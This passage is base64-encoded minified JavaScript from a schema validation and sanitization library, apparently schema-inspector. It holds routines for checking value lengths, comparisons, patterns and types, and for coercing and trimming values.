RleGVzIFsiK2kuam9pbigiLCAiKSsiXSIpKX19LHBhdHRlcm46ZnVuY3Rpb24oZSx0KXt2YXIgbj10aGlzLHI9ZS5wYXR0ZXJuO2lmKCJzdHJpbmciPT10eXBlb2YgdCl7dmFyIGk9ITE7Xy5hcnJheShyKXx8KHI9W3JdKSxyLmZvckVhY2goZnVuY3Rpb24oZSl7InN0cmluZyI9PXR5cGVvZiBlJiZlIGluIG0mJihlPW1bZV0pLGUgaW5zdGFuY2VvZiBSZWdFeHAmJmUudGVzdCh0KSYmKGk9ITApfSksaXx8bi5yZXBvcnQoIm11c3QgbWF0Y2ggWyIrci5qb2luKCIgb3IgIikrJ10sIGJ1dCBpcyBlcXVhbCB0byAiJyt0KyciJyl9fSx2YWxpZERhdGU6ZnVuY3Rpb24oZSx0KXsidHJ1ZSI9PT1TdHJpbmcoZS52YWxpZERhdGUpJiZ0IGluc3RhbmNlb2YgRGF0ZSYmaXNOYU4odC5nZXRUaW1lKCkpJiZ0aGlzLnJlcG9ydCgibXVzdCBiZSBhIHZhbGlkIGRhdGUiKX0sbWluTGVuZ3RoOmZ1bmN0aW9uKGUsdCl7aWYoInN0cmluZyI9PXR5cGVvZiB0fHxfLmFycmF5KHQpKXt2YXIgbj1OdW1iZXIoZS5taW5MZW5ndGgpO2lzTmFOKG4pfHx0Lmxlbmd0aDxuJiZ0aGlzLnJlcG9ydCgibXVzdCBiZSBsb25nZXIgdGhhbiAiK24rIiBlbGVtZW50cywgYnV0IGl0IGhhcyAiK3QubGVuZ3RoKX19LG1heExlbmd0aDpmdW5jdGlvbihlLHQpe2lmKCJzdHJpbmciPT10eXBlb2YgdHx8Xy5hcnJheSh0KSl7dmFyIG49TnVtYmVyKGUubWF4TGVuZ3RoKTtpc05hTihuKXx8dC5sZW5ndGg+biYmdGhpcy5yZXBvcnQoIm11c3QgYmUgc2hvcnRlciB0aGFuICIrbisiIGVsZW1lbnRzLCBidXQgaXQgaGFzICIrdC5sZW5ndGgpfX0sZXhhY3RMZW5ndGg6ZnVuY3Rpb24oZSx0KXtpZigic3RyaW5nIj09dHlwZW9mIHR8fF8uYXJyYXkodCkpe3ZhciBuPU51bWJlcihlLmV4YWN0TGVuZ3RoKTtpc05hTihuKXx8dC5sZW5ndGghPT1uJiZ0aGlzLnJlcG9ydCgibXVzdCBoYXZlIGV4YWN0bHkgIituKyIgZWxlbWVudHMsIGJ1dCBpdCBoYXZlICIrdC5sZW5ndGgpfX0sbHQ6ZnVuY3Rpb24oZSx0KXt2YXIgbj1OdW1iZXIoZS5sdCk7Im51bWJlciIhPXR5cGVvZiB0fHxpc05hTihuKXx8dD49biYmdGhpcy5yZXBvcnQoIm11c3QgYmUgbGVzcyB0aGFuICIrbisnLCBidXQgaXMgZXF1YWwgdG8gIicrdCsnIicpfSxsdGU6ZnVuY3Rpb24oZSx0KXt2YXIgbj1OdW1iZXIoZS5sdGUpOyJudW1iZXIiIT10eXBlb2YgdHx8aXNOYU4obil8fHQ+biYmdGhpcy5yZXBvcnQoIm11c3QgYmUgbGVzcyB0aGFuIG9yIGVxdWFsIHRvICIrbisnLCBidXQgaXMgZXF1YWwgdG8gIicrdCsnIicpfSxndDpmdW5jdGlvbihlLHQpe3ZhciBuPU51bWJlcihlLmd0KTsibnVtYmVyIiE9dHlwZW9mIHR8fGlzTmFOKG4pfHxuPj10JiZ0aGlzLnJlcG9ydCgibXVzdCBiZSBncmVhdGVyIHRoYW4gIituKycsIGJ1dCBpcyBlcXVhbCB0byAiJyt0KyciJyl9LGd0ZTpmdW5jdGlvbihlLHQpe3ZhciBuPU51bWJlcihlLmd0ZSk7Im51bWJlciIhPXR5cGVvZiB0fHxpc05hTihuKXx8bj50JiZ0aGlzLnJlcG9ydCgibXVzdCBiZSBncmVhdGVyIHRoYW4gb3IgZXF1YWwgdG8gIituKycsIGJ1dCBpcyBlcXVhbCB0byAiJyt0KyciJyl9LGVxOmZ1bmN0aW9uKGUsdCl7aWYoIm51bWJlciI9PXR5cGVvZiB0fHwic3RyaW5nIj09dHlwZW9mIHR8fCJib29sZWFuIj09dHlwZW9mIHQpe3ZhciBuPWUuZXE7aWYoIm51bWJlciI9PXR5cGVvZiBufHwic3RyaW5nIj09dHlwZW9mIG58fCJib29sZWFuIj09dHlwZW9mIG58fF8uYXJyYXkobikpaWYoXy5hcnJheShuKSl7Zm9yKHZhciByPTA7cjxuLmxlbmd0aDtyKyspaWYodD09PW5bcl0pcmV0dXJuO3RoaXMucmVwb3J0KCJtdXN0IGJlIGVxdWFsIHRvIFsiK24ubWFwKGZ1bmN0aW9uKGUpe3JldHVybiciJytlKyciJ30pLmpvaW4oIiBvciAiKSsnXSwgYnV0IGlzIGVxdWFsIHRvICInK3QrJyInKX1lbHNlIHQhPT1uJiZ0aGlzLnJlcG9ydCgnbXVzdCBiZSBlcXVhbCB0byAiJytuKyciLCBidXQgaXMgZXF1YWwgdG8gIicrdCsnIicpfX0sbmU6ZnVuY3Rpb24oZSx0KXtpZigibnVtYmVyIj09dHlwZW9mIHR8fCJzdHJpbmciPT10eXBlb2YgdCl7dmFyIG49ZS5uZTtpZigibnVtYmVyIj09dHlwZW9mIG58fCJzdHJpbmciPT10eXBlb2Ygbnx8Xy5hcnJheShuKSlpZihfLmFycmF5KG4pKXtmb3IodmFyIHI9MDtyPG4ubGVuZ3RoO3IrKylpZih0PT09bltyXSlyZXR1cm4gdm9pZCB0aGlzLnJlcG9ydCgnbXVzdCBub3QgYmUgZXF1YWwgdG8gIicrbltyXSsnIicpfWVsc2UgdD09PW4mJnRoaXMucmVwb3J0KCdtdXN0IG5vdCBiZSBlcXVhbCB0byAiJytuKyciJyl9fSxzb21lS2V5czpmdW5jdGlvbihlLHQpe3ZhciBuPWUuc29tZUtleXM7aWYoXy5vYmplY3QodCkpe3ZhciByPW4uc29tZShmdW5jdGlvbihlKXtyZXR1cm4gZSBpbiB0fSk7cnx8dGhpcy5yZXBvcnQoIm11c3QgaGF2ZSBhdCBsZWFzdCBrZXkgIituLm1hcChmdW5jdGlvbihlKXtyZXR1cm4nIicrZSsnIid9KS5qb2luKCIgb3IgIikpfX0sc3RyaWN0OmZ1bmN0aW9uKGUsdCl7aWYoInN0cmluZyI9PXR5cGVvZiBlLnN0cmljdCYmKGUuc3RyaWN0PSJ0cnVlIj09PWUuc3RyaWN0KSxlLnN0cmljdD09PSEwJiZfLm9iamVjdCh0KSYmXy5vYmplY3QoZS5wcm9wZXJ0aWVzKSl7dmFyIG49dGhpcztpZigidW5kZWZpbmVkIj09dHlwZW9mIGUucHJvcGVydGllc1siKiJdKXt2YXIgcj1PYmplY3Qua2V5cyh0KS5maWx0ZXIoZnVuY3Rpb24odCl7cmV0dXJuInVuZGVmaW5lZCI9PXR5cGVvZiBlLnByb3BlcnRpZXNbdF19KTtpZihyLmxlbmd0aD4wKXt2YXIgaT0ic2hvdWxkIG5vdCBjb250YWlucyAiKyhyLmxlbmd0aD4xPyJwcm9wZXJ0aWVzIjoicHJvcGVydHkiKSsiIFsiK3IubWFwKGZ1bmN0aW9uKGUpe3JldHVybiciJytlKyciJ30pLmpvaW4oIiwgIikrIl0iO24ucmVwb3J0KGkpfX19fSxleGVjOmZ1bmN0aW9uKGUsdCxuKXt2YXIgcj10aGlzO3JldHVybiJmdW5jdGlvbiI9PXR5cGVvZiBuP3RoaXMuYXN5bmNFeGVjKGUsdCxuKTp2b2lkKF8uYXJyYXkoZS5leGVjKT9lLmV4ZWM6W2UuZXhlY10pLmZvckVhY2goZnVuY3Rpb24obil7ImZ1bmN0aW9uIj09dHlwZW9mIG4mJm4uY2FsbChyLGUsdCl9KX0scHJvcGVydGllczpmdW5jdGlvbihlLHQsbil7aWYoImZ1bmN0aW9uIj09dHlwZW9mIG4pcmV0dXJuIHRoaXMuYXN5bmNQcm9wZXJ0aWVzKGUsdCxuKTtpZihlLnByb3BlcnRpZXMgaW5zdGFuY2VvZiBPYmplY3QmJnQgaW5zdGFuY2VvZiBPYmplY3Qpe3ZhciByLGk9ZS5wcm9wZXJ0aWVzO2lmKG51bGwhPWlbIioiXSlmb3IociBpbiB0KXIgaW4gaXx8KHRoaXMuX2RlZXBlck9iamVjdChyKSx0aGlzLl92YWxpZGF0ZShpWyIqIl0sdFtyXSksdGhpcy5fYmFjaygpKTtmb3IociBpbiBpKSIqIiE9PXImJih0aGlzLl9kZWVwZXJPYmplY3QociksdGhpcy5fdmFsaWRhdGUoaVtyXSx0W3JdKSx0aGlzLl9iYWNrKCkpfX0saXRlbXM6ZnVuY3Rpb24oZSx0LG4pe2lmKCJmdW5jdGlvbiI9PXR5cGVvZiBuKXJldHVybiB0aGlzLmFzeW5jSXRlbXMoZSx0LG4pO2lmKGUuaXRlbXMgaW5zdGFuY2VvZiBPYmplY3QmJnQgaW5zdGFuY2VvZiBPYmplY3Qpe3ZhciByLGkscz1lLml0ZW1zO2lmKF8uYXJyYXkocykmJl8uYXJyYXkodCkpZm9yKHI9MCxpPXMubGVuZ3RoO2k+cjtyKyspdGhpcy5fZGVlcGVyQXJyYXkociksdGhpcy5fdmFsaWRhdGUoc1tyXSx0W3JdKSx0aGlzLl9iYWNrKCk7ZWxzZSBmb3IodmFyIG8gaW4gdCl0Lmhhc093blByb3BlcnR5KG8pJiYodGhpcy5fZGVlcGVyQXJyYXkobyksdGhpcy5fdmFsaWRhdGUocyx0W29dKSx0aGlzLl9iYWNrKCkpfX19LGc9e2FzeW5jRXhlYzpmdW5jdGlvbihlLHQsbil7dmFyIHI9dGhpcztwLmVhY2hTZXJpZXMoXy5hcnJheShlLmV4ZWMpP2UuZXhlYzpbZS5leGVjXSxmdW5jdGlvbihuLGkpe2lmKCJmdW5jdGlvbiI9PXR5cGVvZiBuKXtpZihuLmxlbmd0aD4yKXJldHVybiBuLmNhbGwocixlLHQsaSk7bi5jYWxsKHIsZSx0KX1wLm5leHRUaWNrKGkpfSxuKX0sYXN5bmNQcm9wZXJ0aWVzOmZ1bmN0aW9uKGUsdCxuKXtpZighKGUucHJvcGVydGllcyBpbnN0YW5jZW9mIE9iamVjdCYmXy5vYmplY3QodCkpKXJldHVybiBuKCk7dmFyIHI9dGhpcyxpPWUucHJvcGVydGllcztwLnNlcmllcyhbZnVuY3Rpb24oZSl7cmV0dXJuIG51bGw9PWlbIioiXT9lKCk6dm9pZCBwLmVhY2hTZXJpZXMoT2JqZWN0LmtleXModCksZnVuY3Rpb24oZSxuKXtyZXR1cm4gZSBpbiBpP3AubmV4dFRpY2sobik6KHIuX2RlZXBlck9iamVjdChlKSx2b2lkIHIuX2FzeW5jVmFsaWRhdGUoaVsiKiJdLHRbZV0sZnVuY3Rpb24oZSl7ci5fYmFjaygpLG4oZSl9KSl9LGUpfSxmdW5jdGlvbihlKXtwLmVhY2hTZXJpZXMoT2JqZWN0LmtleXMoaSksZnVuY3Rpb24oZSxuKXtyZXR1cm4iKiI9PT1lP3AubmV4dFRpY2sobik6KHIuX2RlZXBlck9iamVjdChlKSx2b2lkIHIuX2FzeW5jVmFsaWRhdGUoaVtlXSx0W2VdLGZ1bmN0aW9uKGUpe3IuX2JhY2soKSxuKGUpfSkpfSxlKX1dLG4pfSxhc3luY0l0ZW1zOmZ1bmN0aW9uKGUsdCxuKXtpZighKGUuaXRlbXMgaW5zdGFuY2VvZiBPYmplY3QmJnQgaW5zdGFuY2VvZiBPYmplY3QpKXJldHVybiBuKCk7dmFyIHI9dGhpcyxpPWUuaXRlbXM7Xy5hcnJheShpKSYmXy5hcnJheSh0KT9wLnRpbWVzU2VyaWVzKGkubGVuZ3RoLGZ1bmN0aW9uKGUsbil7ci5fZGVlcGVyQXJyYXkoZSksci5fYXN5bmNWYWxpZGF0ZShpW2VdLHRbZV0sZnVuY3Rpb24oZSx0KXtyLl9iYWNrKCksbihlLHQpfSksci5fYmFjaygpfSxuKTpwLmVhY2hTZXJpZXMoT2JqZWN0LmtleXModCksZnVuY3Rpb24oZSxuKXtyLl9kZWVwZXJBcnJheShlKSxyLl9hc3luY1ZhbGlkYXRlKGksdFtlXSxmdW5jdGlvbihlLHQpe3IuX2JhY2soKSxuKGUsdCl9KX0sbil9fTt0KGMucHJvdG90eXBlLHkpLHQoYy5wcm90b3R5cGUsZyksdChjLG5ldyBpKSxjLnByb3RvdHlwZS52YWxpZGF0ZT1mdW5jdGlvbihlLHQpe2lmKHRoaXMub3JpZ2luPWUsImZ1bmN0aW9uIj09dHlwZW9mIHQpe3ZhciBuPXRoaXM7cmV0dXJuIHAubmV4dFRpY2soZnVuY3Rpb24oKXtuLl9hc3luY1ZhbGlkYXRlKG4uX3NjaGVtYSxlLGZ1bmN0aW9uKGUpe24ub3JpZ2luPW51bGwsdChlLG4ucmVzdWx0KCkpfSl9KX1yZXR1cm4gdGhpcy5fdmFsaWRhdGUodGhpcy5fc2NoZW1hLGUpLnJlc3VsdCgpfSxjLnByb3RvdHlwZS5fdmFsaWRhdGU9ZnVuY3Rpb24oZSx0LG4pe3JldHVybiB0aGlzLnVzZXJDb2RlPWUuY29kZXx8bnVsbCx0aGlzLnVzZXJFcnJvcj1lLmVycm9yfHxudWxsLHRoaXMudXNlckFsaWFzPWUuYWxpYXN8fG51bGwsdGhpcy5fYmFzaWNGaWVsZHMuZm9yRWFjaChmdW5jdGlvbihuKXsobiBpbiBlfHwib3B0aW9uYWwiPT09bikmJiJmdW5jdGlvbiI9PXR5cGVvZiB0aGlzW25dJiZ0aGlzW25dKGUsdCl9LHRoaXMpLHRoaXMuX2N1c3RvbUZpZWxkcy5mb3JFYWNoKGZ1bmN0aW9uKG4pe24gaW4gZSYmImZ1bmN0aW9uIj09dHlwZW9mIHRoaXMuX2N1c3RvbVtuXSYmdGhpcy5fY3VzdG9tW25dLmNhbGwodGhpcyxlLHQpfSx0aGlzKSx0aGlzfSxjLnByb3RvdHlwZS5fYXN5bmNWYWxpZGF0ZT1mdW5jdGlvbihlLHQsbil7dmFyIHI9dGhpczt0aGlzLnVzZXJDb2RlPWUuY29kZXx8bnVsbCx0aGlzLnVzZXJFcnJvcj1lLmVycm9yfHxudWxsLHRoaXMudXNlckFsaWFzPWUuYWxpYXN8fG51bGwscC5zZXJpZXMoW2Z1bmN0aW9uKG4pe3AuZWFjaFNlcmllcyhPYmplY3Qua2V5cyh5KSxmdW5jdGlvbihuLGkpe3AubmV4dFRpY2soZnVuY3Rpb24oKXtpZigobiBpbiBlfHwib3B0aW9uYWwiPT09bikmJiJmdW5jdGlvbiI9PXR5cGVvZiByW25dKXtpZihyW25dLmxlbmd0aD4yKXJldHVybiByW25dKGUsdCxpKTtyW25dKGUsdCl9aSgpfSl9LG4pfSxmdW5jdGlvbihuKXtwLmVhY2hTZXJpZXMoT2JqZWN0LmtleXMoci5fY3VzdG9tKSxmdW5jdGlvbihuLGkpe3AubmV4dFRpY2soZnVuY3Rpb24oKXtpZihuIGluIGUmJiJmdW5jdGlvbiI9PXR5cGVvZiByLl9jdXN0b21bbl0pe2lmKHIuX2N1c3RvbVtuXS5sZW5ndGg+MilyZXR1cm4gci5fY3VzdG9tW25dLmNhbGwocixlLHQsaSk7ci5fY3VzdG9tW25dLmNhbGwocixlLHQpfWkoKX0pfSxuKX1dLG4pfTt2YXIgdj17bnVtYmVyOmZ1bmN0aW9uKGUsdCl7dmFyIG47aWYoIm51bWJlciI9PXR5cGVvZiBlKXJldHVybiBlO2lmKCIiPT09ZSlyZXR1cm4idW5kZWZpbmVkIiE9dHlwZW9mIHQuZGVmP3QuZGVmOm51bGw7aWYoInN0cmluZyI9PXR5cGVvZiBlKXtpZihuPXBhcnNlRmxvYXQoZS5yZXBsYWNlKC8sL2csIi4iKS5yZXBsYWNlKC8gL2csIiIpKSwibnVtYmVyIj09dHlwZW9mIG4pcmV0dXJuIG59ZWxzZSBpZihlIGluc3RhbmNlb2YgRGF0ZSlyZXR1cm4rZTtyZXR1cm4gbnVsbH0saW50ZWdlcjpmdW5jdGlvbihlLHQpe3ZhciBuO2lmKCJudW1iZXIiPT10eXBlb2YgZSYmZSUxPT09MClyZXR1cm4gZTtpZigiIj09PWUpcmV0dXJuInVuZGVmaW5lZCIhPXR5cGVvZiB0LmRlZj90LmRlZjpudWxsO2lmKCJzdHJpbmciPT10eXBlb2YgZSl7aWYobj1wYXJzZUludChlLnJlcGxhY2UoLyAvZywiIiksMTApLCJudW1iZXIiPT10eXBlb2YgbilyZXR1cm4gbn1lbHNle2lmKCJudW1iZXIiPT10eXBlb2YgZSlyZXR1cm4gcGFyc2VJbnQoZSwxMCk7aWYoImJvb2xlYW4iPT10eXBlb2YgZSlyZXR1cm4gZT8xOjA7aWYoZSBpbnN0YW5jZW9mIERhdGUpcmV0dXJuK2V9cmV0dXJuIG51bGx9LHN0cmluZzpmdW5jdGlvbihlLHQpe3JldHVybiJib29sZWFuIj09dHlwZW9mIGV8fCJudW1iZXIiPT10eXBlb2YgZXx8ZSBpbnN0YW5jZW9mIERhdGU/ZS50b1N0cmluZygpOl8uYXJyYXkoZSk/dC5pdGVtc3x8dC5wcm9wZXJ0aWVzP2U6ZS5qb2luKFN0cmluZyh0LmpvaW5XaXRofHwiLCIpKTplIGluc3RhbmNlb2YgT2JqZWN0P3QuaXRlbXN8fHQucHJvcGVydGllcz9lOkpTT04uc3RyaW5naWZ5KGUpOiJzdHJpbmciPT10eXBlb2YgZSYmZS5sZW5ndGg/ZTpudWxsfSxkYXRlOmZ1bmN0aW9uKGUsdCl7aWYoZSBpbnN0YW5jZW9mIERhdGUpcmV0dXJuIGU7dmFyIG49bmV3IERhdGUoZSk7cmV0dXJuIGlzTmFOKG4uZ2V0VGltZSgpKT9udWxsOm59LCJib29sZWFuIjpmdW5jdGlvbihlLHQpe3JldHVybiJ1bmRlZmluZWQiPT10eXBlb2YgZT9udWxsOiJzdHJpbmciPT10eXBlb2YgZSYmImZhbHNlIj09PWUudG9Mb3dlckNhc2UoKT8hMTohIWV9LG9iamVjdDpmdW5jdGlvbihlLHQpe2lmKCJzdHJpbmciIT10eXBlb2YgZXx8Xy5vYmplY3QoZSkpcmV0dXJuIGU7dHJ5e3JldHVybiBKU09OLnBhcnNlKGUpfWNhdGNoKG4pe3JldHVybiBudWxsfX0sYXJyYXk6ZnVuY3Rpb24oZSx0KXtpZihfLmFycmF5KGUpKXJldHVybiBlO2lmKCJ1bmRlZmluZWQiPT10eXBlb2YgZSlyZXR1cm4gbnVsbDtpZigic3RyaW5nIj09dHlwZW9mIGUpe2lmKCJbIj09PWUuc3Vic3RyaW5nKDAsMSkmJiJdIj09PWUuc2xpY2UoLTEpKXRyeXtyZXR1cm4gSlNPTi5wYXJzZShlKX1jYXRjaChuKXtyZXR1cm4gbnVsbH1yZXR1cm4gZS5zcGxpdChTdHJpbmcodC5zcGxpdFdpdGh8fCIsIikpfXJldHVybiBfLmFycmF5KGUpP251bGw6W2VdfX0sYj17dXBwZXI6ZnVuY3Rpb24oZSl7cmV0dXJuIGUudG9VcHBlckNhc2UoKX0sbG93ZXI6ZnVuY3Rpb24oZSl7cmV0dXJuIGUudG9Mb3dlckNhc2UoKX0sdGl0bGU6ZnVuY3Rpb24oZSl7cmV0dXJuIGUucmVwbGFjZSgvXFMqL2csZnVuY3Rpb24oZSl7cmV0dXJuIGUuY2hhckF0KDApLnRvVXBwZXJDYXNlKCkrZS5zdWJzdHIoMSkudG9Mb3dlckNhc2UoKX0pfSxjYXBpdGFsaXplOmZ1bmN0aW9uKGUpe3JldHVybiBlLmNoYXJBdCgwKS50b1VwcGVyQ2FzZSgpK2Uuc3Vic3RyKDEpLnRvTG93ZXJDYXNlKCl9LHVjZmlyc3Q6ZnVuY3Rpb24oZSl7cmV0dXJuIGUuY2hhckF0KDApLnRvVXBwZXJDYXNlKCkrZS5zdWJzdHIoMSl9LHRyaW06ZnVuY3Rpb24oZSl7cmV0dXJuIGUudHJpbSgpfX0sTT17c3RyaWN0OmZ1bmN0aW9uKGUsdCl7aWYoInN0cmluZyI9PXR5cGVvZiBlLnN0cmljdCYmKGUuc3RyaWN0PSJ0cnVlIj09PWUuc3RyaWN0KSxlLnN0cmljdCE9PSEwKXJldHVybiB0O2lmKCFfLm9iamVjdChlLnByb3BlcnRpZXMpKXJldHVybiB0O2lmKCFfLm9iamVjdCh0KSlyZXR1cm4gdDtyZXR1cm4gT2JqZWN0LmtleXModCkuZm9yRWFjaChmdW5jdGlvbihuKXtuIGluIGUucHJvcGVydGllc3x8ZGVsZXRlIHRbbl19KSx0fSxvcHRpb25hbDpmdW5jdGlvbihlLHQpe3ZhciBuPSJib29sZWFuIj09dHlwZW9mIGUub3B0aW9uYWw/ZS5vcHRpb25hbDoiZmFsc2UiIT09ZS5vcHRpb25hbDtyZXR1cm4gbj09PSEwP3Q6InVuZGVmaW5lZCIhPXR5cGVvZiB0P3Q6KHRoaXMucmVwb3J0KCksZS5kZWY9PT1EYXRlP25ldyBEYXRlOmUuZGVmKX0sdHlwZTpmdW5jdGlvbihlLHQpe2lmKCJzdHJpbmciIT10eXBlb2YgZS50eXBlfHwiZnVuY3Rpb24iIT10eXBlb2YgdltlLnR5cGVdKXJldHVybiB0O3ZhciBuLHI9ImJvb2xlYW4iPT10eXBlb2YgZS5vcHRpb25hbD9lLm9wdGlvbmFsOiEwO3JldHVybiJmdW5jdGlvbiI9PXR5cGVvZiB2W2UudHlwZV0/KG49dltlLnR5cGVdKHQsZSksKG51bGw9PT1uJiYhcnx8IW4mJmlzTmFOKG4pfHxudWxsPT09biYmInN0cmluZyI9PT1lLnR5cGUpJiYobj1lLmRlZikpOnJ8fChuPWUuZGVmKSwobnVsbCE9bnx8InVuZGVmaW5lZCIhPXR5cGVvZiBlLmRlZiYmZS5kZWY9PT1uKSYmbiE9PXQ/KHRoaXMucmVwb3J0KCksbik6dH0scnVsZXM6ZnVuY3Rpb24oZSx0KXt2YXIgbj1lLnJ1bGVzO2lmKCJzdHJpbmciIT10eXBlb2YgdHx8InN0cmluZyIhPXR5cGVvZiBuJiYhXy5hcnJheShuKSlyZXR1cm4gdDt2YXIgcj0hMTtyZXR1cm4oXy5hcnJheShuKT9uOltuXSkuZm9yRWFjaChmdW5jdGlvbihlKXsiZnVuY3Rpb24iPT10eXBlb2YgYltlXSYmKHQ9YltlXSh0KSxyPSEwKX0pLHImJnRoaXMucmVwb3J0KCksdH0sbWluOmZ1bmN0aW9uKGUsdCl7dmFyIG49TnVtYmVyKHQpO2lmKGlzTmFOKG4pKXJldHVybiB0O3ZhciByPU51bWJlcihlLm1pbik7cmV0dXJuIGlzTmFOKHIpP3Q6cj5uPyh0aGlzLnJlcG9ydCgpLHIpOnR9LG1heDpmdW5jdGlvbihlLHQpe3ZhciBuPU51bWJlcih0KTtpZihpc05hTihuKSlyZXR1cm4gdDt2YXIgcj1OdW1iZXIoZS5tYXgpO3JldHVybiBpc05hTihyKT90Om4+cj8odGhpcy5yZXBvcnQoKSxyKTp0fSxtaW5MZW5ndGg6ZnVuY3Rpb24oZSx0KXt2YXIgbj1OdW1iZXIoZS5taW5MZW5ndGgpO2lmKCJzdHJpbmciIT10eXBlb2YgdHx8aXNOYU4obil8fDA+bilyZXR1cm4gdDt2YXIgcj0iIixpPW4tdC5sZW5ndGg7aWYoaT4wKXtmb3IodmFyIHM9MDtpPnM7cysrKXIrPSItIjtyZXR1cm4gdGhpcy5yZXBvcnQoKSx0K3J9cmV0dXJuIHR9LG1heExlbmd0aDpmdW5jdGlvbihlLHQpe3ZhciBuPU51bWJlcihlLm1heExlbmd0aCk7cmV0dXJuInN0cmluZyIhPXR5cGVvZiB0fHxpc05hTihuKXx8MD5uP3Q6dC5sZW5ndGg+bj8odGhpcy5yZXBvcnQoKSx0LnNsaWNlKDAsbikpOnR9LHByb3BlcnRpZXM6ZnVuY3Rpb24oZSx0LG4pe2lmKCJmdW5jdGlvbiI9PXR5cGVvZiBuKXJldHVybiB0aGlzLmFzeW5jUHJvcGVydGllcyhlLHQsbik7aWYoIXR8fCJvYmplY3QiIT10eXBlb2YgdClyZXR1cm4gdDt2YXIgcixpLHM9ZS5wcm9wZXJ0aWVzO2lmKCJ1bmRlZmluZWQiIT10eXBlb2Ygc1siKiJdKWZvcihpIGluIHQpaSBpbiBzfHwodGhpcy5fZGVlcGVyT2JqZWN0KGkpLHI9dGhpcy5fc2FuaXRpemUoZS5wcm9wZXJ0aWVzWyIqIl0sdFtpXSksInVuZGVmaW5lZCIhPXR5cGVvZiByJiYodFtpXT1yKSx0aGlzLl9iYWNrKCkpO2ZvcihpIGluIGUucHJvcGVydGllcykiKiIhPT1pJiYodGhpcy5fZGVlcGVyT2JqZWN0KGkpLHI9dGhpcy5fc2FuaXRpemUoZS5wcm9wZXJ0aWVzW2ldLHRbaV0pLCJ1bmRlZmluZWQiIT10eXBlb2YgciYmKHRbaV09ciksdGhpcy5fYmFjaygpKTtyZXR1cm4gdH0saXRlbXM6ZnVuY3Rpb24oZSx0LG4pe2lmKCJmdW5jdGlvbiI9PXR5cGVvZiBuKXJldHVybiB0aGlzLmFzeW5jSXRlbXMoZSx0LG4pO2lmKCEoZS5pdGVtcyBpbnN0YW5jZW9mIE9iamVjdCYmdCBpbnN0YW5jZW9mIE9iamVjdCkpcmV0dXJuIHQ7dmFyIHI7aWYoXy5hcnJheShlLml0ZW1zKSYmXy5hcnJheSh0KSl7dmFyIGk9ZS5pdGVtcy5sZW5ndGg8dC5sZW5ndGg/ZS5pdGVtcy5sZW5ndGg6dC5sZW5ndGg7Zm9yKHI9MDtpPnI7cisrKXRoaXMuX2RlZXBlckFycmF5KHIpLHRbcl09dGhpcy5fc2FuaXRpemUoZS5pdGVtc1tyXSx0W3JdKSx0aGlzLl9iYWNrKCl9ZWxzZSBmb3IociBpbiB0KXRoaXMuX2RlZXBlckFycmF5KHIpLHRbcl09dGhpcy5fc2FuaXRpemUoZS5pdGVtcyx0W3JdKSx0aGlzLl9iYWNrKCk7cmV0dXJuIHR9LGV4ZWM6ZnVuY3Rpb24oZSx0LG4pe2lmKCJmdW5jdGlvbiI9PXR5cGVvZiBuKXJldHVybiB0aGlzLmFzeW5jRXhlYyhlLHQsbik7dmFyIHI9Xy5hcnJheShlLmV4ZWMpP2UuZXhlYzpbZS5leGVjXTtyZXR1cm4gci5mb3JFYWNoKGZ1bmN0aW9uKG4peyJmdW5jdGlvbiI9PXR5cGVvZiBuJiYodD1uLmNhbGwodGhpcyxlLHQpKX0sdGhpcyksdH19LEw9e2FzeW5jRXhlYzpmdW5jdGlvbihlLHQsbil7dmFyIHI9dGhpcyxpPV8uYXJyYXkoZS5leGVjKT9lLmV4ZWM6W2UuZXhlY107cC5lYWNoU2VyaWVzKGksZnVuY3Rpb24obixpKXtpZigiZnVuY3Rpb24iPT10eXBlb2Ygbil7aWYobi5sZW5ndGg+MilyZXR1cm4gbi5jYWxsKHIsZSx0LGZ1bmN0aW9uKGUsbil7cmV0dXJuIGU/aShlKToodD1uLA0Kdm9pZCBpKCkpfSk7dD1uLmNhbGwocixlLHQpfWkoKX0sZnVuY3Rpb24oZSl7bihlLHQpfSl9LGFzeW5jUHJvcGVydGllczpmdW5jdGlvbihlLHQsbil7aWYoIXR8fCJvYmplY3QiIT10eXBlb2YgdClyZXR1cm4gbihudWxsLHQpO3ZhciByPXRoaXMsaT1lLnByb3BlcnRpZXM7cC5zZXJpZXMoW2Z1bmN0aW9uKGUpe2lmKG51bGw9PWlbIioiXSlyZXR1cm4gZSgpO3ZhciBuPWlbIioiXTtwLmVhY2hTZXJpZXMoT2JqZWN0LmtleXModCksZnVuY3Rpb24oZSxzKXtyZXR1cm4gZSBpbiBpP3MoKTooci5fZGVlcGVyT2JqZWN0KGUpLHZvaWQgci5fYXN5bmNTYW5pdGl6ZShuLHRbZV0sZnVuY3Rpb24obixpKXsidW5kZWZpbmVkIiE9dHlwZW9mIGkmJih0W2VdPWkpLHIuX2JhY2soKSxzKCl9KSl9LGUpfSxmdW5jdGlvbihlKXtwLmVhY2hTZXJpZXMoT2JqZWN0LmtleXMoaSksZnVuY3Rpb24oZSxuKXtyZXR1cm4iKiI9PT1lP24oKTooci5fZGVlcGVyT2JqZWN0KGUpLHZvaWQgci5fYXN5bmNTYW5pdGl6ZShpW2VdLHRbZV0sZnVuY3Rpb24oaSxzKXtyZXR1cm4gaT9uKGkpOigidW5kZWZpbmVkIiE9dHlwZW9mIHMmJih0W2VdPXMpLHIuX2JhY2soKSx2b2lkIG4oKSl9KSl9LGUpfV0sZnVuY3Rpb24oZSl7cmV0dXJuIG4oZSx0KX0pfSxhc3luY0l0ZW1zOmZ1bmN0aW9uKGUsdCxuKXtpZighKGUuaXRlbXMgaW5zdGFuY2VvZiBPYmplY3QmJnQgaW5zdGFuY2VvZiBPYmplY3QpKXJldHVybiBuKG51bGwsdCk7dmFyIHI9dGhpcyxpPWUuaXRlbXM7aWYoXy5hcnJheShpKSYmXy5hcnJheSh0KSl7dmFyIHM9aS5sZW5ndGg8dC5sZW5ndGg/aS5sZW5ndGg6dC5sZW5ndGg7cC50aW1lc1NlcmllcyhzLGZ1bmN0aW9uKGUsbil7ci5fZGVlcGVyQXJyYXkoZSksci5fYXN5bmNTYW5pdGl6ZShpW2VdLHRbZV0sZnVuY3Rpb24oaSxzKXtyZXR1cm4gaT9uKGkpOih0W2VdPXMsci5fYmFjaygpLHZvaWQgbigpKX0pfSxmdW5jdGlvbihlKXtuKGUsdCl9KX1lbHNlIHAuZWFjaFNlcmllcyhPYmplY3Qua2V5cyh0KSxmdW5jdGlvbihlLG4pe3IuX2RlZXBlckFycmF5KGUpLHIuX2FzeW5jU2FuaXRpemUoaSx0W2VdLGZ1bmN0aW9uKGkscyl7cmV0dXJuIGk/bigpOih0W2VdPXMsci5fY